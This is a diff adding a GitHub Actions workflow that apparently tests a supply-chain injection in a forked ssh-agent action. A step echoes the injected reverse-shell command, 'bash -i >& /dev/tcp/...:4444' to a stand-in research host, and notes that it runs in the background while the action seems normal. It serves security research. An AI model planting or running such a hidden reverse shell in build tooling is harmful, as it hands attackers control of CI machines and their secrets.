@@ -1,0 +1,22 @@
+name: "#7 terraform — reverse shell"
+on: workflow_dispatch
+
+jobs:
+  test-terraform:
+    name: "terraform — reverse shell"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Run forked ssh-agent (injection at dist/index.js line 1)"
+        uses: rafidhaque/ssh-agent@d986f55834180e616dcf351a8c154074462668ab
+        with:
+          ssh-private-key: "not-a-real-key"
+        continue-on-error: true
+
+      - name: "Verify: reverse shell attempted"
+        run: |
+          echo "=== The injected JS runs: bash -i >& /dev/tcp/eaction-research.example.com/4444 ==="
+          echo "=== Uses async exec() — connection fails (domain unresolvable) ==="
+          echo "=== The action continues normally after the background exec ==="
+          echo "=== Check action step logs for connection refused or DNS errors ==="
